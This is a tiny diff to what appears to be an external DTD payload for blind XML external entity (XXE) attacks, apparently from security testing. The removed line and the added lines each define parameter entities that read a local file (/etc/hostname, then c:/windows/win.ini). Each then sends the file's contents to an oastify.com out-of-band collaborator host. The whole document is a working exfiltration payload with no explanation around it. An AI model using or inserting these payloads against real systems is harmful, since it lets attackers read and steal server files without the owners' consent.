@@ -1,1 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://mb1q8dcrjl2fawkeikggbe0er5xwlohc6.oastify.com/?x=%file;'>">%eval;
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://s92w6jaxhr0l82ikgqem9kykpbv2jugi5.oastify.com/?%data;'>">
